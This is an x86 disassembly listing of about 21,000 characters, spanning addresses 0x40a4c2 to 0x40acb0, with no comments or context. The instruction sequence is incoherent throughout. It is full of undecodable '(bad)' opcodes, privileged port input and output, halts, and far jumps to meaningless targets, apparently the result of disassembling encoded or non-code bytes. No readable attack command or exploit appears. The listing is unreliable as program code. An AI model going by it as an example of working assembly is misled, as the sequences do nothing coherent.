  40a4c2:	mov    edx,0xf2d9f2d7
  40a4c7:	cld    
  40a4c8:	sar    bl,cl
  40a4ca:	not    ebx
  40a4cc:	fadd   st,st(0)
  40a4ce:	add    al,0xdb
  40a4d0:	in     eax,0xf5
  40a4d2:	jecxz  0x40a4c1
  40a4d4:	in     eax,0xea
  40a4d6:	rcr    ebp,1
  40a4d8:	mov    dl,0xc6
  40a4da:	(bad)
  40a4dd:	rcl    ecx,1
  40a4df:	mov    al,0xd0
  40a4e1:	out    dx,al
  40a4e2:	imul   ecx
  40a4e4:	hlt    
  40a4e5:	fucomp st(5)
  40a4e7:	mov    esp,0xd5c5d1bd
  40a4ec:	loopne 0x40a4e7
  40a4ee:	std    
  40a4ef:	jmp    0x40a4f1
  40a4f1:	hlt    
  40a4f2:	(bad)  
  40a4f4:	into   
  40a4f5:	fdiv   DWORD PTR [ecx-0x10500836]
  40a4fb:	jecxz  0x40a4aa
  40a4fd:	test   al,0xb3
  40a4ff:	stc    
  40a500:	in     al,0xfa
  40a502:	idiv   DWORD PTR [eax-0x62f3038]
  40a508:	add    DWORD PTR [edi+0xac0c3d6],edi
  40a50e:	rcr    dh,0xd6
  40a511:	out    dx,eax
  40a512:	aam    0xd9
  40a514:	jmp    0xe0d6:0xb2dfe4df
  40a51b:	leave  
  40a51c:	in     eax,0xec
  40a51e:	out    dx,al
  40a51f:	leave  
  40a520:	mov    edi,0x3d1f4e4
  40a525:	div    al
  40a527:	aad    0xf6
  40a529:	(bad)  
  40a52b:	mov    esp,0xdddde0c7
  40a530:	in     eax,0xe7
  40a532:	iret   
  40a533:	sti    
  40a534:	int    0xff
  40a536:	leave  
  40a537:	in     eax,dx
  40a538:	retf   0xb1cb
  40a53b:	(bad)  
  40a53c:	repnz out dx,al
  40a53e:	(bad)  
  40a541:	into   
  40a542:	out    dx,al
  40a543:	sti    
  40a544:	(bad)  
  40a546:	iret   
  40a547:	mov    ecx,0xdad7def1
  40a54c:	out    0x4,eax
  40a54e:	ret    0xfe05
  40a551:	stc    
  40a552:	out    dx,al
  40a553:	dec    ebx
  40a555:	(bad)  
  40a556:	int    0xe9
  40a558:	mov    al,0xc5
  40a55a:	hlt    
  40a55b:	int3   
  40a55c:	cmc    
  40a55d:	mov    bh,0xb2
  40a55f:	out    0xe9,al
  40a561:	(bad)  
  40a562:	shl    BYTE PTR [ebp+edi*4-0x126273e],1
  40a569:	mov    ah,0xe3
  40a56b:	stc    
  40a56c:	mov    esp,0xc1ddf5d9
  40a571:	out    0xd5,eax
  40a573:	leave  
  40a574:	adc    esp,esi
  40a576:	iret   
  40a577:	repnz mov cl,0xea
  40a57a:	aad    0xd3
  40a57c:	mov    ebx,0xc7c6f9d1
  40a581:	(bad)  
  40a583:	sti    
  40a584:	repnz lock (bad) 
  40a588:	cld    
  40a589:	fiadd  WORD PTR [esi]
  40a58b:	(bad)  
  40a58c:	sti    
  40a58d:	mov    eax,0x9ee0aea
  40a592:	in     eax,0xde
  40a594:	fsubp  st(7),st
  40a596:	mov    dl,0xe9
  40a598:	xlat   BYTE PTR ds:[ebx]
  40a599:	shl    BYTE PTR [eax-0xb312c20],1
  40a59f:	in     eax,dx
  40a5a0:	out    dx,al
  40a5a1:	lds    edi,FWORD PTR [edx-0x22fe2c37]
  40a5a7:	fcmovnu st,st(6)
  40a5a9:	rol    ch,0xbc
  40a5ac:	rol    ecx,cl
  40a5ae:	shl    esp,0x2
  40a5b1:	std    
  40a5b2:	aam    0x7
  40a5b4:	in     eax,dx
  40a5b5:	bswap  esp
  40a5b7:	retf   
  40a5b8:	mov    dl,0xbc
  40a5ba:	mov    cl,0xe3
  40a5bc:	ret    
  40a5bd:	retf   0xf6f4
  40a5c0:	icebp  
  40a5c1:	(bad)  
  40a5c4:	mov    eax,0xfbe3d302
  40a5c9:	(bad)  
  40a5cb:	fild   DWORD PTR [ebx+eiz*8]
  40a5ce:	ret    0xfe09
  40a5d1:	fcomi  st,st(4)
  40a5d3:	fsubr  st,st(7)
  40a5d5:	add    eax,0xe2b2dfe9
  40a5da:	(bad)  
  40a5db:	repz jmp 0xea0f5f97
  40a5e1:	mov    edi,0xc9c8f5c5
  40a5e6:	loopne 0x40a5c8
  40a5e8:	cmc    
  40a5e9:	sti    
  40a5ea:	push   es
  40a5eb:	or     eax,esi
  40a5ed:	aad    0xdb
  40a5ef:	rol    ecx,0xe0
  40a5f2:	fucom  st(3)
  40a5f4:	inc    BYTE PTR [esi]
  40a5f6:	(bad)
  40a5fa:	lods   eax,DWORD PTR ds:[esi]
  40a5fb:	stos   BYTE PTR es:[edi],al
  40a5fc:	lods   eax,DWORD PTR ds:[esi]
  40a5fd:	mov    bl,0xf5
  40a5ff:	mov    bh,0xcc
  40a601:	fcmovnu st,st(6)
  40a603:	repz lock out dx,al
  40a606:	jmp    0x32179fe
  40a60b:	add    bh,dh
  40a60d:	(bad)  
  40a60f:	retf   
  40a610:	push   es
  40a611:	loope  0x40a5f3
  40a613:	aam    0x3
  40a615:	int    0xdc
  40a617:	(bad)  
  40a618:	test   eax,0xc0c0dcc3
  40a61e:	out    dx,al
  40a61f:	fsubr  st,st(3)
  40a621:	mov    eax,0xf7f6fad9
  40a626:	ret    
  40a627:	sar    edi,cl
  40a629:	out    dx,al
  40a62a:	mov    ebx,0x9d2eb02
  40a62f:	fmul   QWORD PTR [eax]
  40a631:	or     dl,ch
  40a633:	std    
  40a634:	out    dx,eax
  40a635:	add    cl,bl
  40a637:	mov    al,0xe3
  40a639:	(bad)  
  40a63a:	out    dx,al
  40a63b:	loopne 0x40a60c
  40a63d:	iret   
  40a63e:	icebp  
  40a63f:	sti    
  40a640:	(bad)  
  40a641:	fistp  QWORD PTR [edx-0x16253316]
  40a647:	std    
  40a648:	add    esp,ebp
  40a64a:	rol    edx,0xea
  40a64d:	std    
  40a64e:	add    bl,ah
  40a650:	add    eax,0xcecae1c8
  40a655:	stc    
  40a656:	jmp    0x40a607
  40a658:	mov    esp,0xceb4c3c0
  40a65d:	rol    eax,cl
  40a65f:	stc    
  40a660:	int    0xc5
  40a662:	cld    
  40a663:	fucomi st,st(0)
  40a665:	(bad)  
  40a666:	add    edi,esp
  40a668:	shl    ah,cl
  40a66a:	lock std 
  40a66c:	cmc    
  40a66d:	(bad)  
  40a66e:	cmc    
  40a66f:	jmp    0xd9cf:0xffcbe4ea
  40a676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a677:	int    0xde
  40a679:	shl    DWORD PTR [edi-0x4b481f38],0xe8
  40a680:	fcmovbe st,st(5)
  40a682:	repz mov edi,0xd4e0b8d1
  40a688:	sti    
  40a689:	add    ecx,ebp
  40a68b:	(bad)  
  40a68c:	fisttp WORD PTR [ecx]
  40a68e:	cli    
  40a68f:	ret    0xbe9
  40a692:	paddusb mm5,mm6
  40a695:	shl    BYTE PTR [ebx-0x3e4e1943],cl
  40a69b:	mov    ch,0xe4
  40a69d:	ret    0xf2c7
  40a6a0:	shl    esi,1
  40a6a2:	mov    edi,0xd0d8d0ce
  40a6a7:	in     al,dx
  40a6a8:	(bad)  
  40a6aa:	add    al,0xc4
  40a6ac:	lock fucom st(5)
  40a6af:	ret    0xe8
  40a6b2:	or     eax,0xafe60108
  40a6b7:	fsubr  DWORD PTR [ebp-0x3b0c114f]
  40a6bd:	ret    0xd0c7
  40a6c0:	fld    TBYTE PTR [ebx+edi*4-0x3e080a0a]
  40a6c7:	(bad)  
  40a6c9:	int3   
  40a6ca:	not    eax
  40a6cc:	push   es
  40a6cd:	rol    eax,1
  40a6cf:	or     cl,BYTE PTR [eax]
  40a6d1:	loopne 0x40a69a
  40a6d3:	std    
  40a6d4:	(bad)  
  40a6d6:	int3   
  40a6d7:	repz call 0xc62971bb
  40a6dd:	iret   
  40a6de:	(bad)
  40a6e1:	jmp    0x40a6c1
  40a6e3:	mov    ch,0xbb
  40a6e5:	int3   
  40a6e6:	idiv   esi
  40a6e8:	mov    ch,0xcc
  40a6ea:	f2xm1  
  40a6ec:	(bad)  
  40a6ee:	not    bh
  40a6f0:	fdivr  st,st(7)
  40a6f2:	cmc    
  40a6f3:	les    eax,FWORD PTR [esi]
  40a6f5:	repz jmp 0xeff3:0xaef1d0c9
  40a6fd:	(bad)  
  40a6fe:	jmp    0xec3b9fb9
  40a703:	mov    esp,0xc2f1d2b5
  40a708:	int3   
  40a709:	ror    esp,1
  40a70b:	loopne 0x40a6ca
  40a70d:	jmp    0xc1078810
  40a712:	or     bh,ch
  40a714:	add    ebx,ecx
  40a716:	ror    cl,1
  40a718:	ret    
  40a719:	aad    0xf3
  40a71b:	(bad)  
  40a71c:	jecxz  0x40a6e7
  40a71e:	mov    edx,0xfcf1cffa
  40a723:	fdiv   st,st(5)
  40a725:	loope  0x40a716
  40a727:	shl    eax,cl
  40a729:	std    
  40a72a:	shl    bh,1
  40a72c:	jmp    0x40a700
  40a72e:	or     ah,dh
  40a730:	hlt    
  40a731:	loopne 0x40a700
  40a733:	or     dl,BYTE PTR [ebx]
  40a735:	or     eax,0xb2ecc3ef
  40a73a:	mul    ah
  40a73c:	(bad)  
  40a73d:	cmc    
  40a73e:	lock retf 
  40a740:	(bad)  
  40a741:	rcl    edx,1
  40a743:	cld    
  40a744:	fxtract 
  40a746:	clc    
  40a747:	repnz repz shl esp,0xdb
  40a74c:	push   es
  40a74d:	fdecstp 
  40a74f:	leave  
  40a750:	loopne 0x40a755
  40a752:	push   cs
  40a753:	leave  
  40a754:	or     esi,edi
  40a756:	jmp    0xc3d0:0xeee2b2c9
  40a75d:	lods   al,BYTE PTR ds:[esi]
  40a75e:	enter  0xf1d9,0xca
  40a762:	fucomp st(4)
  40a764:	fucomp st(5)
  40a766:	add    dl,al
  40a768:	add    bl,dh
  40a76a:	int3   
  40a76b:	int3   
  40a76c:	fcomip st,st(4)
  40a76e:	test   cl,0xcb
  40a771:	cmc    
  40a772:	(bad)  
  40a773:	fcmovne st,st(0)
  40a775:	adc    ecx,edi
  40a777:	int3   
  40a778:	shl    eax,0xf0
  40a77b:	out    0xef,al
  40a77d:	loop   0x40a74b
  40a77f:	retf   0xecf5
  40a782:	shl    edx,1
  40a784:	jmp    0x40a762
  40a786:	dec    al
  40a788:	clc    
  40a789:	add    eax,0xe5e0e4bb
  40a78e:	clc    
  40a78f:	jmp    0x6ee:0xfffb05cb
  40a796:	frstor [esi-0x4b1e0d32]
  40a79c:	test   eax,0xfaefd5b7
  40a7a1:	lods   al,BYTE PTR ds:[esi]
  40a7a2:	mov    ecx,0xd4bdcab8
  40a7a7:	ror    edi,1
  40a7a9:	loopne 0x40a77b
  40a7ab:	(bad)
  40a7ae:	std    
  40a7af:	loopne 0x40a779
  40a7b1:	(bad)  
  40a7b2:	aam    0xcc
  40a7b4:	int    0xcf
  40a7b6:	mov    esi,0xe3c1e8cd
  40a7bb:	aam    0xec
  40a7bd:	stc    
  40a7be:	call   0xcb076cbd
  40a7c3:	out    dx,eax
  40a7c4:	add    dl,cl
  40a7c6:	lock not esi
  40a7c9:	mov    eax,0xf6d0fcc3
  40a7ce:	add    BYTE PTR [ecx],al
  40a7d0:	fsubr  st(2),st
  40a7d2:	call   0xd14e70c2
  40a7d7:	enter  0xcde6,0xcf
  40a7db:	aam    0xda
  40a7dd:	rcl    edi,1
  40a7df:	mov    al,0xc4
  40a7e1:	fcmovne st,st(3)
  40a7e3:	(bad)  
  40a7e4:	shl    dl,1
  40a7e6:	icebp  
  40a7e7:	shl    BYTE PTR [ebp-0x2022030e],0xdf
  40a7ee:	fucom  st(5)
  40a7f0:	leave  
  40a7f1:	jmp    0xca1d96f9
  40a7f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7f7:	shl    cl,cl
  40a7f9:	into   
  40a7fa:	lods   eax,DWORD PTR ds:[esi]
  40a7fb:	in     al,dx
  40a7fc:	call   0xed3173ce
  40a801:	retf   0xf3ee
  40a804:	call   0xbd295fd5
  40a809:	out    0xf6,al
  40a80b:	out    0xdf,al
  40a80d:	loope  0x40a7e6
  40a80f:	xlat   BYTE PTR ds:[ebx]
  40a810:	add    edx,esp
  40a812:	or     bh,ch
  40a814:	(bad)  
  40a815:	fsub   st(3),st
  40a817:	rol    bl,cl
  40a819:	scas   eax,DWORD PTR es:[edi]
  40a81a:	in     eax,0xf1
  40a81c:	les    esi,FWORD PTR [ebp-0x4a462747]
  40a822:	mov    ebx,0xfaf4f8e4
  40a827:	fdivr  st,st(4)
  40a829:	repz loop 0x40a825
  40a82c:	cmc    
  40a82d:	ror    ebx,1
  40a82f:	or     esp,ecx
  40a831:	leave  
  40a832:	stc    
  40a833:	or     bl,cl
  40a835:	icebp  
  40a836:	(bad)  
  40a837:	shl    BYTE PTR [edi-0x362b1453],cl
  40a83d:	sti    
  40a83e:	fnstenv [edx-0x2d2a0f47]
  40a844:	retf   0xe9ce
  40a847:	jecxz  0x40a83a
  40a849:	fadd   DWORD PTR [edx]
  40a84b:	ret    0xe3d6
  40a84e:	jmp    0xff068f5c
  40a853:	out    0xcb,al
  40a855:	pop    es
  40a856:	rol    al,1
  40a858:	mov    bh,0xd5
  40a85a:	int3   
  40a85b:	div    DWORD PTR [ecx-0x40351231]
  40a861:	in     al,0xf0
  40a863:	mov    ebx,0xe8f7d9bf
  40a868:	cmc    
  40a869:	icebp  
  40a86a:	xlat   BYTE PTR ds:[ebx]
  40a86b:	jmp    0x40a877
  40a86d:	add    cl,ch
  40a86f:	mov    esi,0x5ffdb09
  40a874:	or     BYTE PTR [ebx],cl
  40a876:	mov    ebp,0xafb7ebcd
  40a87b:	mov    al,0xe9
  40a87d:	jmp    0x40a856
  40a87f:	cli    
  40a880:	(bad)  
  40a881:	sti    
  40a882:	fidivr DWORD PTR [eax-0x222b4103]
  40a888:	xlat   BYTE PTR ds:[ebx]
  40a889:	fiadd  DWORD PTR [ecx]
  40a88b:	fndisi(8087 only) 
  40a88d:	add    ebp,ecx
  40a88f:	rcr    ah,1
  40a891:	add    dh,ch
  40a893:	or     BYTE PTR [edx+eiz*8],al
  40a896:	(bad)  [eax-0x24345729]
  40a89c:	mov    al,0xcd
  40a89e:	int    0xd4
  40a8a0:	mov    ecx,0xffc4ecf4
  40a8a5:	mov    ecx,0x600f4cf
  40a8aa:	div    esi
  40a8ac:	(bad)  
  40a8ad:	shr    ecx,1
  40a8af:	add    al,0xf7
  40a8b1:	test   BYTE PTR [ebx],0xdd
  40a8b4:	add    cl,BYTE PTR [edi+ecx*8]
  40a8b7:	icebp  
  40a8b8:	retf   
  40a8b9:	int    0xc5
  40a8bb:	out    0xe1,al
  40a8bd:	call   0xb9f29877
  40a8c2:	fsubp  st(4),st
  40a8c4:	enter  0xfdd3,0xfb
  40a8c8:	(bad)  
  40a8ca:	in     al,0xdc
  40a8cc:	fld    QWORD PTR ds:0xfd0ee5ea
  40a8d2:	hlt    
  40a8d3:	retf   0xd09
  40a8d6:	lock shl BYTE PTR [ecx-0x4b4a3f1a],1
  40a8dd:	retf   
  40a8de:	out    dx,al
  40a8df:	fdiv   st,st(3)
  40a8e1:	mov    bh,0xbe
  40a8e3:	jmp    0x40a899
  40a8e5:	out    dx,eax
  40a8e6:	call   edx
  40a8e8:	sar    bh,1
  40a8ea:	in     al,0xdc
  40a8ec:	pop    es
  40a8ed:	hlt    
  40a8ee:	mov    edi,0xfdcec9ca
  40a8f3:	loopne 0x40a907
  40a8f5:	cld    
  40a8f6:	shl    ch,0xe0
  40a8f9:	(bad)  
  40a8fa:	icebp  
  40a8fb:	(bad)  
  40a8fc:	enter  0xdbe1,0xd6
  40a900:	test   esp,0xe8dcbcb3
  40a906:	icebp  
  40a907:	out    dx,al
  40a908:	(bad)  
  40a909:	(bad)  
  40a90b:	aam    0xe4
  40a90d:	or     ebp,edi
  40a90f:	pop    es
  40a910:	iret   
  40a911:	in     eax,dx
  40a912:	leave  
  40a913:	or     eax,ebx
  40a915:	dec    eax
  40a917:	icebp  
  40a918:	iret   
  40a919:	in     al,dx
  40a91a:	jmp    0xd5bb:0xd7c5c1cf
  40a921:	fcmovne st,st(3)
  40a923:	in     al,dx
  40a924:	lock aad 0xbb
  40a927:	mov    eax,0x2fcd5fe
  40a92c:	cld    
  40a92d:	add    ebp,esp
  40a92f:	lds    ecx,FWORD PTR [edx]
  40a931:	mov    esp,0xe9efca02
  40a936:	leave  
  40a937:	leave  
  40a938:	retf   
  40a939:	mov    esp,0xe8d5d7e3
  40a93e:	mov    dh,0xee
  40a940:	imul   eax
  40a942:	retf   
  40a943:	mov    esi,0xd103b4c9
  40a948:	in     al,dx
  40a949:	int    0xd8
  40a94b:	loop   0x40a951
  40a94d:	(bad)  
  40a94f:	xadd   DWORD PTR [ebx],eax
  40a952:	jmp    0xc2c5:0xe00f07c6
  40a959:	in     eax,0xeb
  40a95b:	(bad)  
  40a95c:	mov    al,0xf5
  40a95e:	aad    0xb0
  40a960:	mov    ah,0xc9
  40a962:	(bad)  
  40a963:	mov    esi,0xe1f3feb5
  40a968:	iret   
  40a969:	add    eax,eax
  40a96b:	loope  0x40a938
  40a96d:	aam    0xc1
  40a96f:	or     edi,ebp
  40a971:	fmul   QWORD PTR [edi]
  40a973:	cli    
  40a974:	cld    
  40a975:	loop   0x40a963
  40a977:	shl    bl,cl
  40a979:	scas   eax,DWORD PTR es:[edi]
  40a97a:	scas   al,BYTE PTR es:[edi]
  40a97b:	fcmovnbe st,st(5)
  40a97d:	in     al,dx
  40a97e:	out    0xd6,al
  40a980:	fnstcw WORD PTR [esi-0x3708422e]
  40a986:	mov    ebx,0xccc7edce
  40a98b:	repz add ch,bl
  40a98e:	rol    dh,1
  40a990:	clc    
  40a991:	(bad)  
  40a992:	out    0xc9,al
  40a994:	out    0x4,al
  40a996:	icebp  
  40a997:	fnsave [edi-0xd0e2d17]
  40a99d:	aad    0xe6
  40a99f:	int3   
  40a9a0:	jmp    0x40a966
  40a9a2:	call   0xfa118c7a
  40a9a7:	mov    ecx,0xccd5eded
  40a9ac:	(bad)  
  40a9ad:	loop   0x40a98c
  40a9af:	(bad)  
  40a9b0:	or     bh,ah
  40a9b2:	or     ah,ah
  40a9b4:	int    0xb
  40a9b6:	scas   al,BYTE PTR es:[edi]
  40a9b7:	loop   0x40a96a
  40a9b9:	mov    ebp,0xd9d1dbd6
  40a9be:	icebp  
  40a9bf:	hlt    
  40a9c0:	(bad)  
  40a9c1:	in     eax,dx
  40a9c2:	mov    bl,0xdd
  40a9c4:	out    dx,al
  40a9c5:	leave  
  40a9c6:	rcl    edi,1
  40a9c8:	aam    0xc3
  40a9ca:	add    DWORD PTR [edx],eax
  40a9cc:	add    eax,0x5c2fdbc
  40a9d1:	out    0xd4,eax
  40a9d3:	in     eax,dx
  40a9d4:	loopne 0x40a9b2
  40a9d6:	ret    
  40a9d7:	call   0xb23579cc
  40a9dc:	lock loopne 0x40a9b7
  40a9df:	mov    eax,0x3f8f8ba
  40a9e4:	retf   0xccf4
  40a9e7:	shr    ebp,cl
  40a9e9:	(bad)  
  40a9ea:	rol    DWORD PTR [edx],1
  40a9ec:	clc    
  40a9ed:	fcmovu st,st(7)
  40a9ef:	ret    0x6c7
  40a9f2:	(bad)  
  40a9f3:	(bad)  
  40a9f5:	cld    
  40a9f6:	mov    cl,0xdf
  40a9f8:	mov    esi,0xeaefafc7
  40a9fd:	jmp    0xcbf670b1
  40aa02:	iret   
  40aa03:	shr    edx,cl
  40aa05:	mov    ebp,0xbf03d100
  40aa0a:	inc    esp
  40aa0c:	stc    
  40aa0d:	jecxz  0x40aa0f
  40aa0f:	shr    bh,1
  40aa11:	jmp    0xd3289002
  40aa16:	stos   DWORD PTR es:[edi],eax
  40aa17:	retf   0xc8f0
  40aa1a:	scas   al,BYTE PTR es:[edi]
  40aa1b:	out    dx,eax
  40aa1c:	loope  0x40a9de
  40aa1e:	in     eax,dx
  40aa1f:	scas   al,BYTE PTR es:[edi]
  40aa20:	(bad)  
  40aa21:	std    
  40aa22:	rcr    ah,1
  40aa24:	sar    BYTE PTR [eax+0x5d7e801],1
  40aa2a:	sar    BYTE PTR [edx-0x2724f524],0xc8
  40aa31:	iret   
  40aa32:	loop   0x40aa47
  40aa34:	jmp    0x40a9fe
  40aa36:	bnd jmp 0xeffd882c
  40aa3c:	loop   0x40aa2c
  40aa3e:	shl    DWORD PTR [ecx-0x34032b01],0xbe
  40aa45:	mov    eax,0xe3d9bff5
  40aa4a:	add    bh,BYTE PTR [esi-0x14040ff9]
  40aa50:	fucomip st,st(2)
  40aa52:	(bad)  
  40aa53:	jmp    0x40aa50
  40aa55:	iret   
  40aa56:	int    0xbf
  40aa58:	int    0xdc
  40aa5a:	int    0xe6
  40aa5c:	mov    bh,0xec
  40aa5e:	aad    0xe5
  40aa60:	out    dx,eax
  40aa61:	mov    dh,0xfd
  40aa63:	repnz mov ebp,0xd5eded
  40aa69:	push   es
  40aa6a:	sti    
  40aa6b:	jecxz  0x40aa4a
  40aa6d:	fxtract 
  40aa6f:	or     ch,dl
  40aa71:	mov    esp,0xe7ffe9ee
  40aa76:	mov    esi,0xf7d6ecc7
  40aa7b:	sti    
  40aa7c:	out    0xc4,al
  40aa7e:	mov    ch,0xc4
  40aa80:	jmp    0xecb0:0xddf8dac9
  40aa87:	rcl    edi,0xe1
  40aa8a:	aam    0xf0
  40aa8c:	rol    ebx,1
  40aa8e:	out    0xc4,eax
  40aa90:	retf   0xe6dc
  40aa93:	int    0xc9
  40aa95:	add    edx,ebx
  40aa97:	int    0xf1
  40aa99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa9a:	hlt    
  40aa9b:	loope  0x40aa86
  40aa9d:	in     al,0xd2
  40aa9f:	mov    dl,0xb0
  40aaa1:	(bad)  
  40aaa2:	fnstenv [esi-0xc3e0908]
  40aaa8:	ret    
  40aaa9:	int3   
  40aaaa:	push   es
  40aaab:	std    
  40aaac:	or     edx,edi
  40aaae:	ror    DWORD PTR [ebx],0xd8
  40aab1:	retf   0xcaf5
  40aab4:	psubw  mm4,mm4
  40aab7:	lock div cl
  40aaba:	lock lock into 
  40aabd:	mov    ah,0xf3
  40aabf:	int3   
  40aac0:	int    0xcd
  40aac2:	mov    ch,0xbb
  40aac4:	jecxz  0x40aac3
  40aac6:	(bad)  
  40aac7:	jecxz  0x40aa85
  40aac9:	repnz fsub st(3),st
  40aacc:	out    0xf4,eax
  40aace:	ret    
  40aacf:	(bad)  
  40aad1:	or     ebx,ecx
  40aad3:	add    bl,ch
  40aad5:	in     eax,dx
  40aad6:	retf   
  40aad7:	fild   QWORD PTR [eax-0x1b3b4230]
  40aadd:	mov    dh,0xb4
  40aadf:	repz (bad) 
  40aae1:	int3   
  40aae2:	sar    BYTE PTR [ebp+ebx*8-0x2c183104],1
  40aae9:	(bad)  
  40aaeb:	rcl    ah,1
  40aaed:	rol    bl,cl
  40aaef:	fsub   st(2),st
  40aaf1:	add    al,0xd5
  40aaf3:	(bad)  
  40aaf5:	fsubr  DWORD PTR [edi-0x382e2310]
  40aafb:	cmc    
  40aafc:	lods   eax,DWORD PTR ds:[esi]
  40aafd:	loope  0x40aae5
  40aaff:	neg    ecx
  40ab01:	mov    ebx,0xbdd7d9ee
  40ab06:	add    bh,dl
  40ab08:	jecxz  0x40aafc
  40ab0a:	sti    
  40ab0b:	(bad)  
  40ab0c:	shl    ebp,cl
  40ab0e:	or     bl,dl
  40ab10:	pop    es
  40ab11:	neg    ah
  40ab13:	paddb  mm2,QWORD PTR [ebx]
  40ab16:	in     al,0xdf
  40ab18:	mov    bh,0xcc
  40ab1a:	ret    0xd7c6
  40ab1d:	call   0xca3680f4
  40ab22:	cld    
  40ab23:	mov    ebp,0xd3bbbabd
  40ab28:	inc    BYTE PTR [edi]
  40ab2a:	hlt    
  40ab2b:	clc    
  40ab2c:	jecxz  0x40aafe
  40ab2e:	(bad)
  40ab31:	in     eax,dx
  40ab32:	(bad)
  40ab35:	or     BYTE PTR [ebx-0x4309483f],dh
  40ab3b:	lods   eax,DWORD PTR ds:[esi]
  40ab3c:	(bad)  
  40ab3e:	jmp    0x40ab19
  40ab40:	icebp  
  40ab41:	call   0xbffc9836
  40ab46:	aam    0xfd
  40ab48:	rcl    edi,0xbd
  40ab4b:	in     al,0xe6
  40ab4d:	not    cl
  40ab4f:	add    eax,0xee0c02fa
  40ab54:	push   es
  40ab55:	in     eax,0xbc
  40ab57:	retf   
  40ab58:	mov    esp,0xc2cee9d7
  40ab5d:	rol    esp,1
  40ab5f:	sti    
  40ab60:	enter  0xdbcc,0xf6
  40ab64:	call   0xf93b7526
  40ab69:	in     al,dx
  40ab6a:	push   es
  40ab6b:	add    esi,edi
  40ab6d:	repnz fucom st(7)
  40ab70:	or     ebp,eax
  40ab72:	in     eax,dx
  40ab73:	add    cl,ah
  40ab75:	jmp    0x40ab5e
  40ab77:	lock repnz shl bl,cl
  40ab7b:	iret   
  40ab7c:	shr    BYTE PTR [edi+eax*8-0x14462c4e],1
  40ab83:	(bad)  
  40ab84:	shr    ecx,cl
  40ab86:	ret    
  40ab87:	fdivr  st,st(4)
  40ab89:	(bad)  
  40ab8a:	hlt    
  40ab8b:	fld    DWORD PTR [ecx]
  40ab8d:	cli    
  40ab8e:	in     al,0xc8
  40ab90:	retf   
  40ab91:	hlt    
  40ab92:	aad    0xca
  40ab94:	or     eax,esp
  40ab96:	lods   eax,DWORD PTR ds:[esi]
  40ab97:	(bad)  
  40ab99:	(bad)  
  40ab9a:	rep lods eax,DWORD PTR ds:[esi]
  40ab9c:	call   0xd4f59783
  40aba1:	(bad)  
  40aba2:	retf   0xd2ce
  40aba5:	cmc    
  40aba6:	xlat   BYTE PTR ds:[ebx]
  40aba7:	cld    
  40aba8:	std    
  40aba9:	int    0x1
  40abab:	mov    edx,0xbdee907
  40abb0:	out    0xc5,al
  40abb2:	fcomp  st(4)
  40abb4:	loopne 0x40ab98
  40abb6:	retf   
  40abb7:	(bad)  
  40abb8:	iret   
  40abb9:	in     eax,0xe1
  40abbb:	les    esi,FWORD PTR [ebp-0x31104c4d]
  40abc1:	mov    dh,0xf2
  40abc3:	cli    
  40abc4:	mov    esi,0xe0d9e8dd
  40abc9:	in     al,dx
  40abca:	(bad)  
  40abcc:	xlat   BYTE PTR ds:[ebx]
  40abcd:	icebp  
  40abce:	fadd   QWORD PTR [esi]
  40abd0:	or     edi,ecx
  40abd2:	fucomip st,st(5)
  40abd4:	int3   
  40abd5:	in     eax,dx
  40abd6:	in     eax,0xe6
  40abd8:	lods   al,BYTE PTR ds:[esi]
  40abd9:	mov    al,0xce
  40abdb:	shr    dl,0xcb
  40abde:	in     eax,0xb2
  40abe0:	fmul   st,st(4)
  40abe2:	mov    ebx,0xe0ecfeb4
  40abe7:	sar    BYTE PTR [ebp+ebp*8-0x250afdfc],cl
  40abee:	test   DWORD PTR ds:0x9fa06d5,0xe4d3c4e8
  40abf8:	repz ret 0xc3e1
  40abfc:	test   eax,0xf8e9fae9
  40ac01:	mov    ecx,0xf7cbfbed
  40ac06:	fcmovnbe st,st(4)
  40ac08:	fmul   st(5),st
  40ac0a:	in     eax,0xda
  40ac0c:	not    dh
  40ac0e:	lock enter 0x90e,0xd4
  40ac13:	in     al,dx
  40ac14:	or     dh,ah
  40ac16:	in     eax,dx
  40ac17:	stos   BYTE PTR es:[edi],al
  40ac18:	mov    bl,0xb6
  40ac1a:	cmc    
  40ac1b:	jmp    0xdb137bf4
  40ac20:	(bad)  
  40ac21:	(bad)  
  40ac23:	mov    ebx,0xdecfc3ca
  40ac28:	test   BYTE PTR [edi],0xe7
  40ac2b:	xlat   BYTE PTR ds:[ebx]
  40ac2c:	add    bh,bh
  40ac2e:	cmc    
  40ac2f:	(bad)  
  40ac30:	retf   0x1fc
  40ac33:	jmp    0x40abff
  40ac35:	loopne 0x40ac15
  40ac37:	retf   0xacbc
  40ac3a:	mov    al,0xb2
  40ac3c:	aam    0xd0
  40ac3e:	out    0xd1,eax
  40ac40:	cli    
  40ac41:	retf   0xe8fd
  40ac44:	fnstsw WORD PTR [ecx-0x3f3f2304]
  40ac4a:	sar    edx,cl
  40ac4c:	shl    ah,0xe9
  40ac4f:	or     bh,ch
  40ac51:	(bad)  
  40ac52:	out    dx,al
  40ac53:	(bad)  
  40ac55:	jmp    0x40ac40
  40ac57:	loope  0x40ac01
  40ac59:	rol    eax,1
  40ac5b:	scas   al,BYTE PTR es:[edi]
  40ac5c:	in     eax,dx
  40ac5d:	in     eax,0xf6
  40ac5f:	mov    ebx,0xccccd0d8
  40ac64:	jmp    0xf7f76967
  40ac69:	std    
  40ac6a:	mov    ebp,0xcbc5d3f8
  40ac6f:	sar    al,0x7
  40ac72:	jmp    ecx
  40ac74:	int3   
  40ac75:	pop    es
  40ac76:	into   
  40ac77:	ror    ecx,0xf7
  40ac7a:	mov    ebp,0xecb7c6fb
  40ac7f:	(bad)  
  40ac80:	int3   
  40ac81:	leave  
  40ac82:	mov    ebp,0xe0cefcbf
  40ac87:	sar    al,0xf3
  40ac8a:	icebp  
  40ac8b:	ret    
  40ac8c:	repz sti 
  40ac8e:	ret    0x5f0
  40ac91:	(bad)  
  40ac92:	jecxz  0x40ac82
  40ac94:	into   
  40ac95:	icebp  
  40ac96:	mov    dl,0xf0
  40ac99:	loop   0x40ac67
  40ac9b:	not    dl
  40ac9d:	lods   al,BYTE PTR ds:[esi]
  40ac9e:	mov    edx,0xd0b4fbe4
  40aca3:	mov    dl,0xd7
  40aca5:	ret    
  40aca6:	shl    dl,1
  40aca8:	sar    cl,0xc6
  40acab:	add    cl,BYTE PTR [ebx]
  40acad:	xlat   BYTE PTR ds:[ebx]
  40acae:	add    al,0xd6
  40acb0:	add    esp,edi
